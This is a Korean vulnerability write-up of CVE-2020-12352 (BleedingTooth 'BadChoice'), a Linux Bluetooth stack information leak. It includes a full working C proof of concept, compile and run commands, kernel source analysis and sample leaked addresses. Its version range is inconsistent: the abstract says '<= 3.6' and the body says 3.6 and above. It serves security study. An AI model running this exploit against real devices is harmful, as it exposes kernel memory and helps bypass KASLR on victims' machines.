# BleedingTooth - BadChoice
본 문서는 구글 보안팀의 [BadChoice 공식 문서](https://github.com/google/security-research/security/advisories/GHSA-7mh3-gq28-gfrq)를 번역하며 재구성한 글입니다.

## Abstract
```
CVE: CVE-2020-12352
Severity: Medium
Platform: Linux Kernel <= 3.6
Attack Type: Stack-Based Information Leak
```
본 글에서 다룰 취약점은 BleedingTooth 취약점 중 BadChoice 공격에 대한 내용으로 `CVE-2020-12352`번을 부여받은 취약점이다. 리눅스 커널 3.6 버전 이상에서 적용되며, [47f2d97d3881 커밋](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/bluetooth/a2mp.c?id=47f2d97d38816aaca94c9b6961c6eff1cfcd0bd6)에서 발생해서 [8e2a0d92c56e 커밋](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/bluetooth/a2mp.c?id=8e2a0d92c56ec6955526a8b60838c9b00f70540d)에 수정되었다. 취약점이 발생한 위치는 `net/bluetooth/a2mp.c` 파일이다.

공격자는 피해자의 bd 주소만 알고 있어도 스택 데이터를 탐색할 수 있다. 이는 KASLR을 우회하기 위한 다양한 포인터 정보를 습득할 수도 있고, 암호화 키와 같이 다른 중요한 정보가 포함될 수도 있다. 

## Proof Of Concept
### poc.c
```c++
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

#define AMP_MGR_CID 0x03

typedef struct {
	uint8_t  code;
	uint8_t  ident;
	uint16_t len;
} __attribute__ ((packed)) amp_mgr_hdr;
#define AMP_MGR_HDR_SIZE 4

#define AMP_INFO_REQ 0x06
typedef struct {
	uint8_t id;
} __attribute__ ((packed)) amp_info_req_parms;

typedef struct {
	uint8_t  mode;
	uint8_t  txwin_size;
	uint8_t  max_transmit;
	uint16_t retrans_timeout;
	uint16_t monitor_timeout;
	uint16_t max_pdu_size;
} __attribute__ ((packed)) l2cap_conf_rfc;

int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data, uint16_t data_length) {
  uint8_t type = HCI_ACLDATA_PKT;

  // flag 필드(16bit)가 BC와 PB로 나누어져 있음.
  uint16_t BCflag = 0x0000;
  uint16_t PBflag = 0x0002;
  uint16_t flags = ((BCflag << 2) | PBflag) & 0x000F; // BC,PB 병합


  hci_acl_hdr hdr;
  hdr.handle = htobs(acl_handle_pack(hci_handle, flags));
  hdr.dlen = data_length;

  struct iovec iv[3];
  
  /*
  ACL(Asynchronous Connection-Less) 패킷 구조
  | opcode (8) | header (32)                                   | data |
  | opcode (8) | handle (12) | PB(2) | BC(2) | data length(16) | data |
  */

  // opcode
  iv[0].iov_base = &type;
  iv[0].iov_len = 1;

  // header
  iv[1].iov_base = &hdr;
  iv[1].iov_len = HCI_ACL_HDR_SIZE;

  // data
  iv[2].iov_base = data;
  iv[2].iov_len = data_length;

  return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
}

int main(int argc, char **argv) {
  if (argc != 2) {
    printf("Usage: %s MAC_ADDR\n", argv[0]);
    return 1;
  }

  // destination bd addr : 실행인자 MAC_ADDR 로 받은 공격대상 MAC 주소
  bdaddr_t dst_addr;
  str2ba(argv[1], &dst_addr);

  // 블루투스 HCI 재실행
  printf("[*] Resetting hci0 device...\n");
  system("sudo hciconfig hci0 down");
  system("sudo hciconfig hci0 up");

  // HCI socket 생성
  printf("[*] Opening hci device...\n");
  struct hci_dev_info di;
  int hci_device_id = hci_get_route(NULL);      // 연결 가능한 장치 중 첫번째 hci
  int hci_socket = hci_open_dev(hci_device_id); // socket 생성
  if (hci_devinfo(hci_device_id, &di) < 0) {
    perror("hci_devinfo");
    return 1;
  }

  // HCI socket 옵션 설정 - HCI_FILTER(2)
  struct hci_filter flt;        // ptypes, events를 멤버로 가지는 구조체
  hci_filter_clear(&flt);       // 0x00 으로 초기화 (memset)
  hci_filter_all_ptypes(&flt);  // 0xff 으로 초기화 (memset)
  hci_filter_all_events(&flt);  // 0xff 으로 초기화 (memset)
  if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) < 0) {
    perror("setsockopt(HCI_FILTER)");
    return 1;
  }

  // HCI socket 옵션 설정 - HCI_DATA_DIR(1)
  int opt = 1; // 값을 1로 설정.
  if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) < 0) {
    perror("setsockopt(HCI_DATA_DIR)");
    return 1;
  }

  // HCI socket으로 공격 대상에 연결
  printf("[*] Connecting to victim...\n");

  struct sockaddr_l2 laddr = {0}; // local bd addr
  laddr.l2_family = AF_BLUETOOTH;
  laddr.l2_bdaddr = di.bdaddr;    // line 89: hci socket에 설정된 bdaddr

  struct sockaddr_l2 raddr = {0}; // remote bd addr
  raddr.l2_family = AF_BLUETOOTH;
  raddr.l2_bdaddr = dst_addr;     // line 79: 실행인자로 받은 공격대상 bdaddr

  int l2_sock;

  // l2통신 소켓 생성
  if ((l2_sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
    perror("socket");
    return 1;
  }

  // bind
  if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
    perror("bind");
    return 1;
  }

  // connect
  if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
    perror("connect");
    return 1;
  }

  struct l2cap_conninfo l2_conninfo;
  socklen_t l2_conninfolen = sizeof(l2_conninfo);
  // 연결된 상태의 socket으로부터 option(연결정보) 획득
  if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo, &l2_conninfolen) < 0) {
    perror("getsockopt");
    return 1;
  }

  // HCI 통신을 위한 handle 생성
  uint16_t hci_handle = l2_conninfo.hci_handle;
  printf("[+] HCI handle: %x\n", hci_handle);

  /*
  첫 번째 통신
   - AMP 채널 형성
   - AMP는 고속 통신을 위한 채널이라고 함. 
  */
  printf("[*] Creating AMP channel...\n");
  struct {
    l2cap_hdr hdr;
  } packet1 = {0};
  packet1.hdr.len = htobs(sizeof(packet1) - L2CAP_HDR_SIZE);
  packet1.hdr.cid = htobs(AMP_MGR_CID);
  hci_send_acl_data(hci_socket, hci_handle, &packet1, sizeof(packet1));

  /*
  두 번째 통신
   - L2CAP 통신 설정
  */
  printf("[*] Configuring to L2CAP_MODE_BASIC...\n");
  struct {
    l2cap_hdr hdr;
    l2cap_cmd_hdr cmd_hdr;
    l2cap_conf_rsp conf_rsp;
    l2cap_conf_opt conf_opt;
    l2cap_conf_rfc conf_rfc;
  } packet2 = {0};
  packet2.hdr.len = htobs(sizeof(packet2) - L2CAP_HDR_SIZE);
  packet2.hdr.cid = htobs(1);

  packet2.cmd_hdr.code = L2CAP_CONF_RSP;
  packet2.cmd_hdr.ident = 0x41;
  packet2.cmd_hdr.len = htobs(sizeof(packet2) - L2CAP_HDR_SIZE - L2CAP_CMD_HDR_SIZE);

  packet2.conf_rsp.scid = htobs(AMP_MGR_CID);
  packet2.conf_rsp.flags = htobs(0);
  packet2.conf_rsp.result = htobs(L2CAP_CONF_UNACCEPT);

  packet2.conf_opt.type = L2CAP_CONF_RFC;
  packet2.conf_opt.len = sizeof(l2cap_conf_rfc);
  packet2.conf_rfc.mode = L2CAP_MODE_BASIC; // mode를 l2cap 기본으로 지정
  hci_send_acl_data(hci_socket, hci_handle, &packet2, sizeof(packet2));

  /*
  세 번째 통신
   - 악성 AMP 패킷 전송

  - https://code.woboq.org/linux/linux/net/bluetooth/a2mp.c.html#a2mp_chan_recv_cb
  */
  printf("[*] Sending malicious AMP info request...\n");
  struct {
    l2cap_hdr hdr;
    amp_mgr_hdr amp_hdr;
    amp_info_req_parms info_req;
  } packet3 = {0};
  packet3.hdr.len = htobs(sizeof(packet3) - L2CAP_HDR_SIZE);
  packet3.hdr.cid = htobs(AMP_MGR_CID);
  packet3.amp_hdr.code = AMP_INFO_REQ; // a2mp_getinfo_req() 로직으로 유도
  packet3.amp_hdr.ident = 0x41;
  packet3.amp_hdr.len = htobs(sizeof(amp_info_req_parms));
  packet3.info_req.id = 0x42; // !hdev 가 참이 되어 if문 내로 분기하도록 유도
  hci_send_acl_data(hci_socket, hci_handle, &packet3, sizeof(packet3));



  /*
  스택 데이터가 포함된 응답값 획득
  */
  // Read responses
  for (int i = 0; i < 64; i++) {
    char buf[1024] = {0};
    size_t buf_size = read(hci_socket, buf, sizeof(buf));
    if (buf_size > 0 && buf[0] == HCI_ACLDATA_PKT) {
      l2cap_hdr *l2_hdr = (l2cap_hdr *)(buf + 5);
      if (btohs(l2_hdr->cid) == AMP_MGR_CID) {
        uint64_t leak1 = *(uint64_t *)(buf + 13) & ~0xffff;
        uint64_t leak2 = *(uint64_t *)(buf + 21);
        uint16_t leak3 = *(uint64_t *)(buf + 29);
        printf("[+] Leaked: %lx, %lx, %x\n", leak1, leak2, leak3);
        break;
      }
    }
  }

  close(l2_sock);
  hci_close_dev(hci_socket);

  return 0;
}
```

## Analysis #1 핵심
본 취약점은 `A2MP_GETINFO_REQ` 요청에서 잘못된 hci 장치 ID 또는 `HCI_AMP` 유형이 아닌 ID를 지정할 때 발생한다. 응답으로 `a2mp_info_rsp` 구조체를 송신하는데, 구조체가 완전히 초기화되지 않은 상태로 응답하게 되어 스택 데이터가 드러나게 된다.

```c++
static int a2mp_getinfo_req(struct amp_mgr *mgr, struct sk_buff *skb,
			    struct a2mp_cmd *hdr)
{
	struct a2mp_info_req *req  = (void *) skb->data;
	struct hci_dev *hdev;
	struct hci_request hreq;
	int err = 0;

	if (le16_to_cpu(hdr->len) < sizeof(*req))
		return -EINVAL;

	BT_DBG("id %d", req->id);

	hdev = hci_dev_get(req->id);
	if (!hdev || hdev->dev_type != HCI_AMP) {
		struct a2mp_info_rsp rsp;

		rsp.id = req->id;
		rsp.status = A2MP_STATUS_INVALID_CTRL_ID;

    // rsp의 모든 멤버가 초기화되지 않음!

		a2mp_send(mgr, A2MP_GETINFO_RSP, hdr->ident, sizeof(rsp),
			  &rsp);

		goto done;
	}
	...
}
```
실제로 `a2mp_info_rsp` 구조체는 다음과 같이 구성되어있다.
```c++
struct a2mp_info_rsp {
	__u8	id;
	__u8	status;
	__le32	total_bw;
	__le32	max_bw;
	__le32	min_latency;
	__le16	pal_cap;
	__le16	assoc_size;
} __packed;
```
앞서 설명했듯이 `a2mp_info_rsp`는 스택에 할당되고나서 처음 2바이트만 초기화되므로 나머지 16바이트에는 스택 프레임에 있던 데이터가 노출된다. `a2mp_send_getinfo_rsp()` 함수에도 동일한 취약점이 존재한다.

## Analysis #2 패킷 수신 로직 분석
그렇다면 `a2mp_getinfo_req()` 함수 내부의 취약한 `if`문 내 코드로 어떻게 흐름을 이끌어낼 수 있을까? 흐름을 알기 위해서는 `/linux/net/bluetooth/`의 [a2mp.c](https://code.woboq.org/linux/linux/net/bluetooth/a2mp.c.html)와 [a2mp.h](https://code.woboq.org/linux/linux/net/bluetooth/a2mp.h) 코드를 살펴보아야 한다.

가장 먼저 a2mp 채널이 생성될 때 실행되는 `a2mp_channel_create()` 함수부터 보자.
```c++
struct l2cap_chan *a2mp_channel_create(struct l2cap_conn *conn,
				       struct sk_buff *skb)
{
	struct amp_mgr *mgr;
	if (conn->hcon->type != ACL_LINK)
		return NULL;
	mgr = amp_mgr_create(conn, false); // AMP 연결이 된다면 mgr이 정상적으로 생성
	if (!mgr) {
		BT_ERR("Could not create AMP manager");
		return NULL;
	}
	BT_DBG("mgr: %p chan %p", mgr, mgr->a2mp_chan);
	return mgr->a2mp_chan;
}
```
AMP 연결이 정상적으로 진행 된다면 mgr이 정상적으로 생성되어야 한다. 그렇다면 mgr을 생성하는 `amp_mgr_create()` 함수를 살펴보자.
```c++
static struct amp_mgr *amp_mgr_create(struct l2cap_conn *conn, bool locked)
{
	struct amp_mgr *mgr;
	struct l2cap_chan *chan;
	mgr = kzalloc(sizeof(*mgr), GFP_KERNEL); // 커널 메모리에 mgr 할당
	if (!mgr)
		return NULL;
	BT_DBG("conn %p mgr %p", conn, mgr);
	mgr->l2cap_conn = conn;
	chan = a2mp_chan_open(conn, locked); // AMP 연결이 된다면 chan이 정상적으로 생성
	if (!chan) { // chan이 제대로 생성되지 않으면 mgr 할당 해제 후 NULL 반환
		kfree(mgr);
		return NULL;
	}
	mgr->a2mp_chan = chan;
	chan->data = mgr;
	conn->hcon->amp_mgr = mgr;
	kref_init(&mgr->kref);
	/* Remote AMP ctrl list initialization */
	INIT_LIST_HEAD(&mgr->amp_ctrls);
	mutex_init(&mgr->amp_ctrls_lock);
	mutex_lock(&amp_mgr_list_lock);
	list_add(&mgr->list, &amp_mgr_list);
	mutex_unlock(&amp_mgr_list_lock);
	return mgr;
}
```
`amp_mgr_create()`가 mgr을 정상적으로 생성했는지에 대한 여부는 `chan` 변수가 잘 설정되었는지에 따라 달렸다. 그렇다면 `chan`을 생성하는 `a2mp_chan_open()` 함수를 보자.
```c++
static struct l2cap_chan *a2mp_chan_open(struct l2cap_conn *conn, bool locked)
{
	struct l2cap_chan *chan;
	int err;
	chan = l2cap_chan_create();
	if (!chan)
		return NULL;
	BT_DBG("chan %p", chan);
	chan->chan_type = L2CAP_CHAN_FIXED;
	chan->scid = L2CAP_CID_A2MP;
	chan->dcid = L2CAP_CID_A2MP;
	chan->omtu = L2CAP_A2MP_DEFAULT_MTU;
	chan->imtu = L2CAP_A2MP_DEFAULT_MTU;
	chan->flush_to = L2CAP_DEFAULT_FLUSH_TO;
	chan->ops = &a2mp_chan_ops; // 상황에 따른 동작을 결정하는 VFT를 설정
	l2cap_chan_set_defaults(chan);
	chan->remote_max_tx = chan->max_tx;
	chan->remote_tx_win = chan->tx_win;
	chan->retrans_timeout = L2CAP_DEFAULT_RETRANS_TO;
	chan->monitor_timeout = L2CAP_DEFAULT_MONITOR_TO;
	skb_queue_head_init(&chan->tx_q);
	chan->mode = L2CAP_MODE_ERTM;
	err = l2cap_ertm_init(chan);
	if (err < 0) {
		l2cap_chan_del(chan, 0);
		return NULL;
	}
	chan->conf_state = 0;
	if (locked)
		__l2cap_chan_add(conn, chan);
	else
		l2cap_chan_add(conn, chan);
	chan->remote_mps = chan->omtu;
	chan->mps = chan->omtu;
	chan->state = BT_CONNECTED;
	return chan;
}
```
`l2cap_chan_create()` 함수를 통해 `chan`을 생성하고, 드디어 구조체의 각종 멤버들을 설정하는 코드들을 볼 수 있다. `chan->ops`를 설정하는 부분을 볼 수 있는데, 일반적으로 소켓통신에서 `ops`라는 명칭의 변수는 VFT(Virtual Function Table)를 사용하는 변수명으로 자주 사용된다. 따라서 `a2mp_chan_ops` 구조체에는 소켓의 각 동작에 사용될 함수들이 정의되어있을 것으로 보인다.

## Analysis #3 취약한 함수로 흐름 제어
`a2mp_chan_ops` 구조체 내용은 아래와 같다.
```c++
static const struct l2cap_ops a2mp_chan_ops = {
	.name = "L2CAP A2MP channel",
	.recv = a2mp_chan_recv_cb, // 수신(.recv) 시 실행되는 함수 정의
	.close = a2mp_chan_close_cb,
	.state_change = a2mp_chan_state_change_cb,
	.alloc_skb = a2mp_chan_alloc_skb_cb,
	/* Not implemented for A2MP */
	.new_connection = l2cap_chan_no_new_connection,
	.teardown = l2cap_chan_no_teardown,
	.ready = l2cap_chan_no_ready,
	.defer = l2cap_chan_no_defer,
	.resume = l2cap_chan_no_resume,
	.set_shutdown = l2cap_chan_no_set_shutdown,
	.get_sndtimeo = l2cap_chan_no_get_sndtimeo,
};
```
위 구조체를 통해 a2mp socket의 각 동작 별 실행할 함수가 어떤 것들이 있는지 알 수 있다. `.recv` 함수가 실행될 때, 실제로 `a2mp_chan_recv_cb()` 함수가 실행되어 데이터를 처리함을 알 수 있다. `a2mp_chan_recv_cb()` 함수에서 수신받은 내용을 어떻게 처리하는지 확인해보자.
```c++
static int a2mp_chan_recv_cb(struct l2cap_chan *chan, struct sk_buff *skb)
{
	struct a2mp_cmd *hdr;
	struct amp_mgr *mgr = chan->data;
	int err = 0;
	amp_mgr_get(mgr);
	while (skb->len >= sizeof(*hdr)) {
		u16 len;
		hdr = (void *) skb->data;
		// ...
		mgr->ident = hdr->ident;
		switch (hdr->code) {
		case A2MP_COMMAND_REJ:
			a2mp_command_rej(mgr, skb, hdr);
			break;
		case A2MP_DISCOVER_REQ:
			err = a2mp_discover_req(mgr, skb, hdr);
			break;
		case A2MP_CHANGE_NOTIFY:
			err = a2mp_change_notify(mgr, skb, hdr);
			break;
		case A2MP_GETINFO_REQ:
			err = a2mp_getinfo_req(mgr, skb, hdr); // 취약한 함수
			break;
		// ...
  }
	// ...
}
```
switch문을 보면 `hdr->code`가 `A2MP_GET_INFO_REQ`인 경우 취약한 코드가 존재하는 `a2mp_getinfo_req()` 함수를 호출한다. 즉, 취약함 함수로의 흐름을 만들어주기 위해서는 `hdr->code`를 `A2MP_GET_INFO_REQ`로 설정해서 전송하면 된다. 그렇다면 `A2MP_GET_INFO_REQ`는 어떤 값을 가지고 있을까?
```c++
#define A2MP_GETINFO_REQ         0x06
```
헤더파일(`a2mp.h`)을 살펴보면 위와 같이 `0x06`로 매크로가 설정되어있는 것을 확인할 수 있다. 실제 공격시에는 값을 그대로 넣어도 되지만 `blueZ` 라이브러리에 선언되어있는 매크로를 이용하면 된다. 
```c++
#define AMP_INFO_REQ		0x06
```
`blueZ` 라이브러리의 [lib/amp.h](https://github.com/pauloborges/bluez/blob/master/lib/amp.h) 파일에 `A2MP_GET_INFO_REQ`와 동일하게 `0x06` 값을 가지는 `AMP_INFO_REQ`라는 매크로가 존재한다.

## Analysis #4 취약한 로직으로 흐름 제어
`a2mp_getinfo_req()` 함수로 흐름을 변경했다면, 취약한 코드가 존재하는 if문 내로 분기해야한다. 조건은 아래와 같다.
```c++
hdev = hci_dev_get(req->id);
if (!hdev || hdev->dev_type != HCI_AMP)
```
`hci_dev_get()` 함수가 정상적인 데이터를 반환하지 않거나, `hdev->dev_type`이 `HCI_AMP`가 아니면 취약한 코드로 진입할 수 있다. `hci_dev_get()`은 HCI에 접근하는 코드이므로, 인자로 전달하는 HCI ID가 잘못된다면 비정상적인 hdev를 만들어낼 수 있다.

따라서 exploit 코드에서는 공격 시 `hdr->code`에 `AMP_INFO_REQ`를 담아 아래와 같이 공격을 진행했다.
```c++
printf("[*] Sending malicious AMP info request...\n");
struct {
  l2cap_hdr hdr;
  amp_mgr_hdr amp_hdr;
  amp_info_req_parms info_req;
} packet3 = {0};
packet3.hdr.len = htobs(sizeof(packet3) - L2CAP_HDR_SIZE);
packet3.hdr.cid = htobs(AMP_MGR_CID);
packet3.amp_hdr.code = AMP_INFO_REQ; // a2mp_getinfo_req() 로직으로 유도
packet3.amp_hdr.ident = 0x41;
packet3.amp_hdr.len = htobs(sizeof(amp_info_req_parms));
packet3.info_req.id = 0x42; // !hdev 가 참이 되어 if문 내로 분기하도록 유도
hci_send_acl_data(hci_socket, hci_handle, &packet3, sizeof(packet3));
```

## Analysis #5 응답값 노출
```c++
struct a2mp_info_rsp {
	__u8	id;
	__u8	status;
  /* 여기서부터 초기화되지 않아서 stack data가 노출되는 멤버들 */
	__le32	total_bw;
	__le32	max_bw;
	__le32	min_latency;
	__le16	pal_cap;
	__le16	assoc_size;
} __packed;
```
스택 데이터가 노출되는 `a2mp_info_rsp` 구조체는 위와 같았다.
```c++
for (int i = 0; i < 64; i++) {
  char buf[1024] = {0};
  size_t buf_size = read(hci_socket, buf, sizeof(buf));
  if (buf_size > 0 && buf[0] == HCI_ACLDATA_PKT) {
    l2cap_hdr *l2_hdr = (l2cap_hdr *)(buf + 5);
    if (btohs(l2_hdr->cid) == AMP_MGR_CID) {
      uint64_t leak1 = *(uint64_t *)(buf + 13) & ~0xffff;
      uint64_t leak2 = *(uint64_t *)(buf + 21);
      uint16_t leak3 = *(uint64_t *)(buf + 29);
      printf("[+] Leaked: %lx, %lx, %x\n", leak1, leak2, leak3);
      break;
    }
  }
}
```

TODO
- 각 오프셋이 무얼 의미하는지 알아보기
  ```
    buf + 5 : a2mp_info_rsp 응답 데이터 시작지점
    buf + 13 : 시작지점 + 8 
    buf + 21 : 시작지점 + 16
    buf + 29 : 시작지점 + 24
  ```

## Usage
POC를 사용하기 위해 `gcc -o poc poc.c -lbluetooth` 명령으로 아래 코드를 컴파일 할 수 있고, 컴파일된 바이너리는 `sudo ./poc 11:22:33:44:55:66` 명령으로 실행할 수 있다. 첫 번째 실행인자 부분에 공격 대상의 bd 주소를 입력하면 된다.

`Ubuntu 20.04` 에서 실행한 결과는 아래와 같다.
```
[*] Resetting hci0 device...
[*] Opening hci device...
[*] Connecting to victim...
[+] HCI handle: 100
[*] Creating AMP channel...
[*] Configuring to L2CAP_MODE_BASIC...
[*] Sending malicious AMP info request...
[+] Leaked: ffffffff98e00000, ffffffff98e001a4, 1229
```